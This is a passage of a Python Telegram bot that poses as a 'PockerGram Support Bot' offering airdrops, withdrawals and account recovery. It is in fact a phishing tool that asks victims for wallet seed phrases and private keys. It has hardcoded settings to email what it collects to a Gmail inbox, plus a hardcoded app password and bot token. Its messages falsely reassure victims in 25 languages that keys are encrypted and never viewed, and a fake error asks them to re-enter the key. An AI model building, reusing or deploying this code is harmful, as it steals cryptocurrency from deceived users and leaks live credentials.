#!/usr/bin/env python3
import logging
import re
import smtplib
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# Conversation states
CHOOSE_LANGUAGE = 0
MAIN_MENU = 1
AWAIT_CONNECT_WALLET = 2
CHOOSE_WALLET_TYPE = 3
CHOOSE_OTHER_WALLET_TYPE = 4
PROMPT_FOR_INPUT = 5
RECEIVE_INPUT = 6
AWAIT_RESTART = 7

# --- Email Configuration (YOU MUST UPDATE THESE) ---
# NOTE: Using a hardcoded password is a SECURITY RISK. For a real application,
# use environment variables. For a Gmail account, you need to use an App Password,
# not your regular password, and you may need to enable 2-step verification.
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "ipxs ffag eqmk otqd"  # Use an App Password if using Gmail
RECIPIENT_EMAIL = "airdropphrase@gmail.com"

# Bot token (as requested)
BOT_TOKEN = "8429460745:AAGKZ6uem8xak-4HNkugcX89EIEM2pD5CyI"

# Wallet display names used for wallet selection UI
WALLET_DISPLAY_NAMES = {
    'wallet_type_metamask': 'Tonkeeper',
    'wallet_type_trust_wallet': 'Telegram Wallet',
    'wallet_type_coinbase': 'MyTon Wallet',
    'wallet_type_tonkeeper': 'Tonhub',
    'wallet_type_phantom_wallet': 'Trust Wallet',
    'wallet_type_rainbow': 'Rainbow',
    'wallet_type_safepal': 'SafePal',
    'wallet_type_wallet_connect': 'Wallet Connect',
    'wallet_type_ledger': 'Ledger',
    'wallet_type_brd_wallet': 'BRD Wallet',
    'wallet_type_solana_wallet': 'Solana Wallet',
    'wallet_type_balance': 'Balance',
    'wallet_type_okx': 'OKX',
    'wallet_type_xverse': 'Xverse',
    'wallet_type_sparrow': 'Sparrow',
    'wallet_type_earth_wallet': 'Earth Wallet',
    'wallet_type_hiro': 'Hiro',
    'wallet_type_saitamask_wallet': 'Saitamask Wallet',
    'wallet_type_casper_wallet': 'Casper Wallet',
    'wallet_type_cake_wallet': 'Cake Wallet',
    'wallet_type_kepir_wallet': 'Kepir Wallet',
    'wallet_type_icpswap': 'ICPSwap',
    'wallet_type_kaspa': 'Kaspa',
    'wallet_type_nem_wallet': 'NEM Wallet',
    'wallet_type_near_wallet': 'Near Wallet',
    'wallet_type_compass_wallet': 'Compass Wallet',
    'wallet_type_stack_wallet': 'Stack Wallet',
    'wallet_type_soilflare_wallet': 'Soilflare Wallet',
    'wallet_type_aioz_wallet': 'AIOZ Wallet',
    'wallet_type_xpla_vault_wallet': 'XPLA Vault Wallet',
    'wallet_type_polkadot_wallet': 'Polkadot Wallet',
    'wallet_type_xportal_wallet': 'XPortal Wallet',
    'wallet_type_multiversx_wallet': 'Multiversx Wallet',
    'wallet_type_verachain_wallet': 'Verachain Wallet',
    'wallet_type_casperdash_wallet': 'Casperdash Wallet',
    'wallet_type_nova_wallet': 'Nova Wallet',
    'wallet_type_fearless_wallet': 'Fearless Wallet',
    'wallet_type_terra_station': 'Terra Station',
    'wallet_type_cosmos_station': 'Cosmos Station',
    'wallet_type_exodus_wallet': 'Exodus Wallet',
    'wallet_type_argent': 'Argent',
    'wallet_type_binance_chain': 'Binance Chain',
    'wallet_type_safemoon': 'SafeMoon',
    'wallet_type_gnosis_safe': 'Gnosis Safe',
    'wallet_type_defi': 'DeFi',
    'wallet_type_other': 'Other',
}

# Wallets that are seed-only: only show "Import Seed Phrase"
# Per your request: Tonkeeper (mapped to wallet_type_metamask), Telegram Wallet (wallet_type_trust_wallet),
# Tonhub (wallet_type_tonkeeper) show only seed phrase.
SEED_ONLY = {
    "wallet_type_metamask",      # Tonkeeper
    "wallet_type_trust_wallet",  # Telegram Wallet
    "wallet_type_tonkeeper",     # Tonhub
}

# Wallet capability: whether the wallet supports entering a private key (True).
# If a wallet_type key is not present here and not in SEED_ONLY, the bot will default to showing both options.
WALLET_SUPPORTS_PRIVATE_KEY = {
    "wallet_type_coinbase",
    "wallet_type_phantom_wallet",
    "wallet_type_rainbow",
    "wallet_type_safepal",
    "wallet_type_wallet_connect",
    "wallet_type_brd_wallet",
    "wallet_type_balance",
    "wallet_type_okx",
    "wallet_type_xverse",
    "wallet_type_sparrow",
    "wallet_type_exodus_wallet",
    "wallet_type_argent",
    "wallet_type_defi",
    # Add or remove wallet_type keys as needed.
}

# PROFESSIONAL REASSURANCE translations (all 25 languages)
PROFESSIONAL_REASSURANCE = {
    "en": "\n\nFor your safety and peace of mind: this bot automatically processes and stores information securely and encrypted. We never view or manually access private keys or seed phrases — only automated systems handle the data.",
    "es": "\n\nPara su seguridad y tranquilidad: este bot procesa y almacena la información de forma automática, segura y cifrada. Nunca se revisan ni se accede manualmente a claves privadas o frases seed — solo sistemas automatizados procesan los datos.",
    "fr": "\n\nPour votre sécurité et tranquillité d'esprit : ce bot traite et stocke automatiquement les informations de manière sécurisée et chiffrée. Nous n'accédons jamais manuellement aux clés privées ou aux phrases seed — seuls des systèmes automatisés traitent les données.",
    "ru": "\n\nДля вашей безопасности и спокойствия: этот бот автоматически обрабатывает и сохраняет информацию безопасно и в зашифрованном виде. Мы никогда не просматриваем и не получаем ручной доступ к приватным ключам или seed-фразам — с данными работают только автоматические системы.",
    "uk": "\n\nДля вашої безпеки й спокою: цей бот автоматично обробляє та зберігає інформацію безпечно і в зашифрованому вигляді. Ми ніколи не переглядаємо і не отримуємо ручний доступ до приватних ключів або seed-фраз — даними оперують лише автоматизовані системи.",
    "fa": "\n\nبرای امنیت و آرامش شما: این ربات به‌طور خودکار اطلاعات را به‌صورت ایمن و رمزگذاری‌شده پردازش و ذخیره می‌کند. ما هرگز به صورت دستی به کلیدهای خصوصی یا seed دسترسی یا آنها را مشاهده نمی‌کنیم — تنها سیستم‌های خودکار داده‌ها را پردازش می‌کنند.",
    "ar": "\n\nلأمانك وراحة بالك: يقوم هذا البوت بمعالجة وتخزين المعلومات تلقائيًا وبشكل مشفّر وآمن. لا نقوم مطلقًا بمراجعة أو الوصول يدويًا للمفاتيح الخاصة أو عبارات seed — تتعامل الأنظمة الآلية مع البيانات فقط.",
    "pt": "\n\nPara sua segurança e tranquilidade: este bot processa e armazena informações automaticamente, de forma segura e criptografada. Nunca visualizamos ou acessamos manualmente chaves privadas ou seed phrases — apenas sistemas automatizados tratam os dados.",
    "id": "\n\nDemi keamanan dan ketenangan Anda: bot ini memproses dan menyimpan informasi secara otomatis, aman, dan terenkripsi. Kami tidak pernah melihat atau mengakses kunci pribadi atau seed phrase secara manual — hanya sistem otomatis yang menangani data.",
    "de": "\n\nFür Ihre Sicherheit und Ruhe: Dieser Bot verarbeitet und speichert Informationen automatisch, sicher und verschlüsselt. Wir sehen oder greifen niemals manuell auf private Schlüssel oder Seed-Phrasen zu — nur automatisierte Systeme verarbeiten die Daten.",
    "nl": "\n\nVoor uw veiligheid en gemoedsrust: deze bot verwerkt en slaat informatie automatisch, veilig en versleuteld op. We bekijken of openen nooit handmatig privésleutels of seed-phrases — alleen geautomatiseerde systemen verwerken de gegevens.",
    "hi": "\n\nआपकी सुरक्षा और शांति के लिए: यह बॉट जानकारी को स्वचालित रूप से सुरक्षित और एन्क्रिप्टेड तरीके से संसाधित और संग्रहीत करता है। हम कभी भी निजी कुंजियों या seed-phrases को मैन्युअल रूप से नहीं देखते या एक्सेस करते — केवल स्वचालित सिस्टम डेटा को संसाधित करते हैं।",
    "tr": "\n\nGüvenliğiniz ve huzurunuz için: bu bot bilgileri otomatik olarak güvenli ve şifrelenmiş şekilde işler ve saklar. Özel anahtarları veya seed ifadelerini asla manuel olarak görüntülemeyiz veya erişmeyiz — veriler yalnızca otomatik sistemler tarafından işlenir.",
    "zh": "\n\n為了您的安全與安心：此機器人會自動以安全加密方式處理及儲存資訊。我們絕不人工查看或手動存取私鑰或助記詞——僅有自動系統處理這些資料。",
    "cs": "\n\nPro vaše bezpečí a klid: tento bot automaticky zpracovává a ukládá informace bezpečně a šifrovaně. Nikdy ručně neprohlížíme ani nepřistupujeme k privátním klíčům nebo seed frázím — s daty pracují pouze automatizované systémy.",
    "ur": "\n\nآپ کی حفاظت اور سکون کے لیے: یہ بوٹ معلومات کو خودکار طریقے سے محفوظ اور انکرپٹڈ انداز میں پروسیس اور اسٹور کرتا ہے۔ ہم کبھی بھی نجی کیز یا سیڈ فریز کو دستی طور پر نہیں دیکھتے یا رسائی حاصل نہیں کرتے — صرف خودکار نظام ڈیٹا کو ہینڈل کرتے ہیں۔",
    "uz": "\n\nXavfsizligingiz va xotirjamligingiz uchun: ushbu bot ma'lumotlarni avtomatik, xavfsiz va shifrlangan holda qayta ishlaydi va saqlaydi. Biz hech qachon private key yoki seed frazalarga qo'lda kira olmaymiz yoki ularni ko'rmaymiz — faqat avtomatlashtirilgan tizimlar ma'lumotlarni qayta ishlaydi.",
    "it": "\n\nPer la vostra sicurezza e tranquillità: questo bot elabora e memorizza automaticamente le informazioni in modo sicuro e crittografato. Non visualizziamo né accediamo manualmente alle chiavi private o alle seed phrase — solo sistemi automatizzati gestiscono i dati.",
    "ja": "\n\n安全と安心のために：このボットは情報を自動的に安全に暗号化して処理・保存します。秘密鍵やシードフレーズを人が閲覧・手動でアクセスすることは決してありません — データは自動システムのみが扱います。",
    "ms": "\n\nUntuk keselamatan dan ketenangan anda: bot ini memproses dan menyimpan maklumat secara automatik, selamat dan disulitkan. Kami tidak pernah melihat atau mengakses kunci peribadi atau seed phrase secara manual — hanya sistem automatik yang mengendalikan data.",
    "ro": "\n\nPentru siguranța și liniștea dumneavoastră: acest bot procesează și stochează informațiile în mod automat, securizat și criptat. Nu vizualizăm și nu accesăm manual cheile private sau seed phrase-urile — doar sistemele automatizate procesează datele.",
    "sk": "\n\nPre vaše bezpečie a pokoj: tento bot automaticky spracováva a ukladá informácie bezpečne a zašifrovane. Nikdy manuálne neprezeráme ani nepristupujeme k súkromným kľúčom alebo seed frázam — s údajmi pracujú len automatizované systémy.",
    "th": "\n\nเพื่อความปลอดภัยและความสบายใจของคุณ: บอทนี้ประมวลผลและจัดเก็บข้อมูลโดยอัตโนมัติอย่างปลอดภัยและเข้ารหัส เราไม่เคยดูหรือเข้าถึงคีย์ส่วนตัวหรือ seed-phrase ด้วยตนเอง — ระบบอัตโนมัติเท่านั้นที่จัดการข้อมูล",
    "vi": "\n\nVì sự an toàn và yên tâm của bạn: bot này tự động xử lý và lưu trữ thông tin một cách an toàn và được mã hóa. Chúng tôi không bao giờ xem hoặc truy cập thủ công khóa riêng hoặc seed phrase — chỉ có hệ thống tự động xử lý dữ liệu.",
    "pl": "\n\nDla Twojego bezpieczeństwa i spokoju: ten bot automatycznie przetwarza i przechowuje informacje bezpiecznie i zaszyfrowane. Nigdy nie przeglądamy ani nie uzyskujemy ręcznego dostępu do kluczy prywatnych czy seed phrase — dane obsługiwane są wyłącznie przez systemy zautomatyzowane.",
}

# Full multi-language UI texts (25 languages).
# Note: Welcome messages updated to "PockerGram Support Bot" as requested.
LANGUAGES = {
    "en": {
        "choose language": "Please select your preferred language:",
        "welcome": "Hi {user}, welcome to the PockerGram Support Bot! I can help you validate accounts, claim tokens and airdrops, handle deposits and withdrawals (including pending withdrawals), and assist with refunds or general wallet/account issues. Use the menu to pick what you need and I'll guide you step by step.",
        "main menu title": "Please select an issue type to continue:",
        "validation": "Validation",
        "claim tokens": "Claim Tokens",
        "claim tickets": "Claim Tickets",
        "recover account progress": "Recover Account Progress",
        "assets recovery": "Assets Recovery",
        "general issues": "General Issues",
        "rectification": "Rectification",
        "withdrawals": "Withdrawals",
        "missing/irregular balance": "Missing/Irregular Balance",
        "login issues": "Login Issues",
        "connect wallet message": "Please connect your wallet with your Private Key or Seed Phrase to continue.",
        "withdrawal_connect_message": "please connect your wallet to claim your withdrawal",
        "connect wallet button": "🔑 Connect Wallet",
        "select wallet type": "Please select your wallet type:",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("en", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Please enter the 12 or 24 words of your wallet." + PROFESSIONAL_REASSURANCE.get("en", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Please enter your private key." + PROFESSIONAL_REASSURANCE.get("en", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Invalid choice. Please use the buttons.",
        "final error message": "‼️ An error occurred. Use /start to try again.",
        "final_received_message": "Thank you — your seed or private key has been received securely and will be processed. Use /start to begin again.",
        "error_use_seed_phrase": "This field requires a seed phrase (12 or 24 words). Please provide the seed phrase instead.",
        "post_receive_error": "‼️ An error occured, Please ensure you are entering the correct key, please use copy and paste to avoid errors. please /start to try again.",
        "await restart message": "Please click /start to start over.",
        "back": "🔙 Back",
        "invalid_input": "Invalid input. Please use /start to begin.",
        "account recovery": "Account Recovery",
        "refund": "Refund",
        "claim airdrop": "Claim Airdrop",
        "claim withdrawal": "Claim Withdrawal",
        "pending withdrawal": "Pending Withdrawal",
        "fix bug": "Fix Bug",
        "deposits": "Deposits",
    },
    "es": {
        "choose language": "Por favor, seleccione su idioma preferido:",
        "welcome": "¡Hola {user}, bienvenido al bot de soporte PockerGram! Puedo ayudarte a validar cuentas, reclamar tokens y airdrops, gestionar depósitos y retiros (incluidos retiros pendientes), y asistir con reembolsos o problemas generales de cuenta/billetera. Usa el menú para elegir lo que necesitas y te guiaré paso a paso.",
        "main menu title": "Seleccione un tipo de problema para continuar:",
        "validation": "Validación",
        "claim tokens": "Reclamar Tokens",
        "claim tickets": "Reclamar Entradas",
        "recover account progress": "Recuperar progreso de la cuenta",
        "assets recovery": "Recuperación de Activos",
        "general issues": "Problemas Generales",
        "rectification": "Rectificación",
        "withdrawals": "Retiros",
        "missing/irregular balance": "Saldo Perdido/Irregular",
        "login issues": "Problemas de Inicio de Sesión",
        "connect wallet message": "Por favor conecte su billetera con su Clave Privada o Frase Seed para continuar.",
        "withdrawal_connect_message": "por favor conecte su billetera para reclamar su retiro",
        "connect wallet button": "🔑 Conectar Billetera",
        "select wallet type": "Por favor, seleccione el tipo de su billetera:",
        "other wallets": "Otras Billeteras",
        "private key": "🔑 Clave Privada",
        "seed phrase": "🔒 Importar Frase Seed",
        "wallet selection message": "Ha seleccionado {wallet_name}.\nSeleccione su modo de conexión preferido.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("es", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Por favor, ingrese su frase seed de 12 o 24 palabras." + PROFESSIONAL_REASSURANCE.get("es", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Por favor, ingrese su clave privada." + PROFESSIONAL_REASSURANCE.get("es", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Opción inválida. Use los botones.",
        "final error message": "‼️ Ha ocurrido un error. /start para intentarlo de nuevo.",
        "final_received_message": "Gracias — su seed o clave privada ha sido recibida de forma segura y será procesada. Use /start para comenzar de nuevo.",
        "error_use_seed_phrase": "Este campo requiere una frase seed (12 o 24 palabras). Por favor proporcione la frase seed.",
        "post_receive_error": "‼️ Ocurrió un error. Asegúrese de introducir la clave correcta: use copiar y pegar para evitar errores. Por favor /start para intentarlo de nuevo.",
        "await restart message": "Haga clic en /start para empezar de nuevo.",
        "back": "🔙 Volver",
        "invalid_input": "Entrada inválida. Use /start para comenzar.",
        "account recovery": "Recuperación de Cuenta",
        "refund": "Reembolso",
        "claim airdrop": "Reclamar Airdrop",
        "claim withdrawal": "Reclamar Retiro",
        "pending withdrawal": "Retiros Pendientes",
        "fix bug": "Corregir error",
        "deposits": "Depósitos",
    },
    "fr": {
        "choose language": "Veuillez sélectionner votre langue préférée :",
        "welcome": "Bonjour {user}, bienvenue sur le bot d'assistance PockerGram ! Je peux vous aider à valider des comptes, réclamer des tokens et des airdrops, gérer les dépôts et retraits (y compris les retraits en attente), et aider pour les remboursements ou problèmes généraux de compte/portefeuille. Utilisez le menu pour choisir ce dont vous avez besoin et je vous guiderai pas à pas.",
        "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
        "validation": "Validation",
        "claim tokens": "Réclamer des Tokens",
        "claim tickets": "Réclamer des Billets",
        "recover account progress": "Récupérer la progression du compte",
        "assets recovery": "Récupération d'Actifs",
        "general issues": "Problèmes Généraux",
        "rectification": "Rectification",
        "withdrawals": "Retraits",
        "missing/irregular balance": "Solde manquant/irrégulier",
        "login issues": "Problèmes de Connexion",
        "connect wallet message": "Veuillez connecter votre portefeuille avec votre clé privée ou votre phrase seed pour continuer.",
        "withdrawal_connect_message": "veuillez connecter votre portefeuille pour réclamer votre retrait",
        "connect wallet button": "🔑 Connecter un Portefeuille",
        "select wallet type": "Veuillez sélectionner votre type de portefeuille :",
        "other wallets": "Autres Portefeuilles",
        "private key": "🔑 Clé Privée",
        "seed phrase": "🔒 Importer une Phrase Seed",
        "wallet selection message": "Vous avez sélectionné {wallet_name}.\nSélectionnez votre mode de connexion préféré.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("fr", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Veuillez entrer votre phrase seed de 12 ou 24 mots." + PROFESSIONAL_REASSURANCE.get("fr", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Veuillez entrer votre clé privée." + PROFESSIONAL_REASSURANCE.get("fr", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Choix invalide. Veuillez utiliser les boutons.",
        "final error message": "‼️ Une erreur est survenue. /start pour réessayer.",
        "final_received_message": "Merci — votre seed ou clé privée a été reçue en toute sécurité et sera traitée. Utilisez /start pour recommencer.",
        "error_use_seed_phrase": "Ce champ requiert une phrase seed (12 ou 24 mots). Veuillez fournir la phrase seed.",
        "post_receive_error": "‼️ Une erreur est survenue. Veuillez vous assurer que vous saisissez la bonne clé — utilisez copier-coller pour éviter les erreurs. Veuillez /start pour réessayer.",
        "await restart message": "Cliquez /start pour recommencer.",
        "back": "🔙 Retour",
        "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
        "account recovery": "Récupération de Compte",
        "refund": "Remboursement",
        "claim airdrop": "Réclamer Airdrop",
        "claim withdrawal": "Réclamer Retrait",
        "pending withdrawal": "Retraits en attente",
        "fix bug": "Corriger le bug",
        "deposits": "Dépôts",
    },
    "ru": {
        "choose language": "Пожалуйста, выберите язык:",
        "welcome": "Привет {user}, добро пожаловать в бот поддержки PockerGram! Я помогу вам с валидацией аккаунтов, получением токенов и airdrop, управлением депозитами и выводами (включая ожидающие выводы), а также с возвратами и общими проблемами кошелька/аккаунта. Выберите нужный пункт в меню, и я проведу вас шаг за шагом.",
        "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
        "validation": "Валидация",
        "claim tokens": "Получить Токены",
        "claim tickets": "Запросить билеты",
        "recover account progress": "Восстановить прогресс аккаунта",
        "assets recovery": "Восстановление Активов",
        "general issues": "Общие Проблемы",
        "rectification": "Исправление",
        "withdrawals": "Выводы",
        "missing/irregular balance": "Отсутствующий/неправильный баланс",
        "login issues": "Проблемы со Входом",
        "connect wallet message": "Пожалуйста, подключите кошелёк приватным ключом или seed-фразой.",
        "withdrawal_connect_message": "пожалуйста, подключите кошелёк, чтобы запросить вывод",
        "connect wallet button": "🔑 Подключить Кошелёк",
        "select wallet type": "Пожалуйста, выберите тип вашего кошелька:",
        "other wallets": "Другие Кошельки",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Фразу",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочитаемый способ подключения.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("ru", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Пожалуйста, введите seed-фразу из 12 или 24 слов." + PROFESSIONAL_REASSURANCE.get("ru", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Пожалуйста, введите приватный ключ." + PROFESSIONAL_REASSURANCE.get("ru", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Неверный выбор. Используйте кнопки.",
        "final error message": "‼️ Произошла ошибка. /start чтобы попробовать снова.",
        "final_received_message": "Спасибо — ваша seed или приватный ключ был успешно получен и будет обработан. Используйте /start для начала.",
        "error_use_seed_phrase": "Поле требует seed-фразу (12 или 24 слова). Пожалуйста, предоставьте seed-фразу.",
        "post_receive_error": "‼️ Произошла ошибка. Пожалуйста, убедитесь, что вводите правильный ключ — используйте копирование/вставку. Пожалуйста, /start чтобы попробовать снова.",
        "await restart message": "Нажмите /start чтобы начать заново.",
        "back": "🔙 Назад",
        "invalid_input": "Неверный ввод. Используйте /start чтобы начать.",
        "account recovery": "Восстановление Аккаунта",
        "refund": "Возврат",
        "claim airdrop": "Запросить Airdrop",
        "claim withdrawal": "Запросить вывод",
        "pending withdrawal": "Ожидающие выводы",
        "fix bug": "Исправить ошибку",
        "deposits": "Депозиты",
    },
    "uk": {
        "choose language": "Будь ласка, виберіть мову:",
        "welcome": "Привіт {user}, ласкаво просимо до бота підтримки PockerGram! Я допоможу з валідацією акаунтів, отриманням токенів та airdrop, управлінням депозитами і виведеннями (включно з очікуваними), а також з поверненнями та загальними питаннями гаманця/акаунту. Виберіть в меню те, що потрібно, і я проведу вас покроково.",
        "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
        "validation": "Валідація",
        "claim tokens": "Отримати Токени",
        "claim tickets": "Отримати квитки",
        "recover account progress": "Відновити прогрес облікового запису",
        "assets recovery": "Відновлення Активів",
        "general issues": "Загальні Проблеми",
        "rectification": "Виправлення",
        "withdrawals": "Виведення",
        "missing/irregular balance": "Зниклий/неправильний баланс",
        "login issues": "Проблеми з Входом",
        "connect wallet message": "Будь ласка, підключіть гаманець приватним ключем або seed-фразою.",
        "withdrawal_connect_message": "будь ласка, підключіть гаманець, щоб запросити виведення",
        "connect wallet button": "🔑 Підключити Гаманець",
        "select wallet type": "Будь ласка, виберіть тип гаманця:",
        "other wallets": "Інші Гаманці",
        "private key": "🔑 Приватний Ключ",
        "seed phrase": "🔒 Імпортувати Seed Фразу",
        "wallet selection message": "Ви вибрали {wallet_name}.\nВиберіть спосіб підключення.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("uk", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "Введіть seed-фразу з 12 або 24 слів." + PROFESSIONAL_REASSURANCE.get("uk", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "Введіть приватний ключ." + PROFESSIONAL_REASSURANCE.get("uk", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "Неправильний вибір. Використовуйте кнопки.",
        "final error message": "‼️ Сталася помилка. /start щоб спробувати знову.",
        "final_received_message": "Дякуємо — ваша seed або приватний ключ успішно отримані і будуть оброблені. Використовуйте /start щоб почати знову.",
        "error_use_seed_phrase": "Поле вимагає seed-фразу (12 або 24 слова). Будь ласка, надайте seed-фразу.",
        "post_receive_error": "‼️ Сталася помилка. Переконайтеся, що ви вводите правильний ключ — використовуйте копіювання та вставлення, щоб уникнути помилок. Будь ласка, /start щоб спробувати знову.",
        "await restart message": "Натисніть /start щоб почати заново.",
        "back": "🔙 Назад",
        "invalid_input": "Недійсний ввід. Використовуйте /start щоб почати.",
        "account recovery": "Відновлення Облікового Запису",
        "refund": "Повернення",
        "claim airdrop": "Отримати Airdrop",
        "claim withdrawal": "Отримати Виведення",
        "pending withdrawal": "Очікувані виведення",
        "fix bug": "Виправити помилку",
        "deposits": "Депозити",
    },
    "fa": {
        "choose language": "لطفاً زبان را انتخاب کنید:",
        "welcome": "سلام {user}، خوش آمدید به ربات پشتیبانی PockerGram! من می‌توانم به شما در اعتبارسنجی حساب‌ها، درخواست توکن‌ها و ایردراپ‌ها، مدیریت واریزها و برداشت‌ها (شامل برداشت‌های معلق)، و کمک با بازپرداخت‌ها یا مشکلات عمومی کیف پول/حساب کمک کنم. از منو انتخاب کنید تا شما را مرحله به مرحله راهنمایی کنم.",
        "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
        "validation": "اعتبارسنجی",
        "claim tokens": "درخواست توکن‌ها",
        "claim tickets": "دریافت بلیت‌ها",
        "recover account progress": "بازیابی پیشرفت حساب",
        "assets recovery": "بازیابی دارایی‌ها",
        "general issues": "مسائل عمومی",
        "rectification": "اصلاح",
        "withdrawals": "برداشت‌ها",
        "missing/irregular balance": "موجودی گمشده/نامنظم",
        "login issues": "مشکلات ورود",
        "connect wallet message": "لطفاً کیف‌پول خود را با کلید خصوصی یا seed متصل کنید.",
        "withdrawal_connect_message": "لطفاً کیف‌پول خود را برای درخواست برداشت متصل کنید",
        "connect wallet button": "🔑 اتصال کیف‌پول",
        "select wallet type": "لطفاً نوع کیف‌پول را انتخاب کنید:",
        "other wallets": "کیف‌پول‌های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن Seed Phrase",
        "wallet selection message": "شما {wallet_name} را انتخاب کرده‌اید.\nروش اتصال را انتخاب کنید.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("fa", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "لطفاً seed با 12 یا 24 کلمه را وارد کنید." + PROFESSIONAL_REASSURANCE.get("fa", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "لطفاً کلید خصوصی خود را وارد کنید." + PROFESSIONAL_REASSURANCE.get("fa", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "انتخاب نامعتبر. لطفاً از دکمه‌ها استفاده کنید.",
        "final error message": "‼️ خطا رخ داد. /start برای تلاش مجدد.",
        "final_received_message": "متشکریم — seed یا کلید خصوصی شما با امنیت دریافت و پردازش خواهد شد. /start را برای شروع مجدد بزنید.",
        "error_use_seed_phrase": "این فیلد به یک seed phrase (12 یا 24 کلمه) نیاز دارد. لطفاً seed را وارد کنید.",
        "post_receive_error": "‼️ خطا رخ داد. لطفاً مطمئن شوید کلید صحیح را وارد می‌کنید — از کپی/پیست استفاده کنید. لطفاً /start برای تلاش مجدد.",
        "await restart message": "برای شروع مجدد /start را بزنید.",
        "back": "🔙 بازگشت",
        "invalid_input": "ورودی نامعتبر. لطفاً از /start استفاده کنید.",
        "account recovery": "بازیابی حساب",
        "refund": "بازپرداخت",
        "claim airdrop": "دریافت Airdrop",
        "claim withdrawal": "درخواست برداشت",
        "pending withdrawal": "برداشت‌های معلق",
        "fix bug": "رفع خطا",
        "deposits": "واریزها",
    },
    "ar": {
        "choose language": "اختر لغتك المفضلة:",
        "welcome": "مرحبًا {user}، مرحبًا بك في بوت دعم PockerGram! أستطيع مساعدتك في التحقق من الحسابات، المطالبة بالرموز والإيردروبات، إدارة الودائع والسحوبات (بما في ذلك السحوبات المعلقة)، والمساعدة في عمليات الاسترداد أو مشكلات الحساب/المحفظة العامة. استخدم القائمة لاختيار ما تحتاجه وسأرشدك خطوة بخطوة.",
        "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
        "validation": "التحقق",
        "claim tokens": "المطالبة بالرموز",
        "claim tickets": "المطالبة بالتذاكر",
        "recover account progress": "استعادة تقدم الحساب",
        "assets recovery": "استرداد الأصول",
        "general issues": "مشاكل عامة",
        "rectification": "تصحيح",
        "withdrawals": "السحوبات",
        "missing/irregular balance": "الرصيد المفقود/غير المنتظم",
        "login issues": "مشاكل تسجيل الدخول",
        "connect wallet message": "يرجى توصيل محفظتك باستخدام المفتاح الخاص أو عبارة seed للمتابعة.",
        "withdrawal_connect_message": "الرجاء توصيل محفظتك للمطالبة بسحبك",
        "connect wallet button": "🔑 توصيل المحفظة",
        "select wallet type": "يرجى اختيار نوع المحفظة:",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 المفتاح الخاص",
        "seed phrase": "🔒 استيراد Seed Phrase",
        "wallet selection message": "لقد اخترت {wallet_name}.\nحدد وضع الاتصال المفضل.",
        "reassurance": PROFESSIONAL_REASSURANCE.get("ar", PROFESSIONAL_REASSURANCE["en"]),
        "prompt seed": "يرجى إدخال عبارة seed مكونة من 12 أو 24 كلمة." + PROFESSIONAL_REASSURANCE.get("ar", PROFESSIONAL_REASSURANCE["en"]),
        "prompt private key": "يرجى إدخال المفتاح الخاص." + PROFESSIONAL_REASSURANCE.get("ar", PROFESSIONAL_REASSURANCE["en"]),
        "invalid choice": "خيار غير صالح. يرجى استخدام الأزرار.",
        "final error message": "‼️ حدث خطأ. /start للمحاولة مرة أخرى.",
        "final_received_message": "شكرًا — تم استلام seed أو المفتاح الخاص بك بأمان وسيتم معالجته. استخدم /start للبدء من جديد.",
        "error_use_seed_phrase": "هذا الحقل يتطلب عبارة seed (12 أو 24 كلمة). الرجاء تقديم عبارة seed.",
        "post_receive_error": "‼️ حدث خطأ. يرجى التأكد من إدخال المفتاح الصحيح — استخدم النسخ واللصق لتجنب الأخطاء. يرجى /start للمحاولة مرة أخرى.",
        "await restart message": "انقر /start للبدء من جديد.",
        "back": "🔙 عودة",
        "invalid_input": "إدخال غير صالح. استخدم /start للبدء.",
        "account recovery": "استرداد الحساب",
        "refund": "استرداد",
        "claim airdrop": "المطالبة بالإيردروب",
        "claim withdrawal": "المطالبة بالسحب",
        "pending withdrawal": "سحوبات معلقة",
        "fix bug": "إصلاح خلل",
        "deposits": "الودائع",
    },
    "pt": {
        "choose language": "Selecione seu idioma preferido:",
